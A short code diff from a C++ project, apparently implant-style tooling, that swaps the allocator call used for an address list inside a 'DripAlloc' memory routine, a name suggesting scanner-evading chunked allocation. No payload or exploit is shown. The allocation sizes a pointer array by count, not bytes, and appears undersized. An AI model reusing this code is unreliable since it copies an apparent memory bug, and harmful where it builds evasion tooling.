@@ -108,7 +108,7 @@ auto DECLFN Memory::DripAlloc(
 
     PVOID  BaseAddress = Self->Usf->ValidGranMem( GranCount );
     PVOID  CurrentBase = BaseAddress;
-    PVOID* AddressList = (PVOID*)Self->Hp->Alloc( GranCount );
+    PVOID* AddressList = (PVOID*)hAlloc( GranCount );
 
     for ( INT i = 0; i < GranCount; i++ ) {
         CurrentBase = Self->Mm->Alloc( 
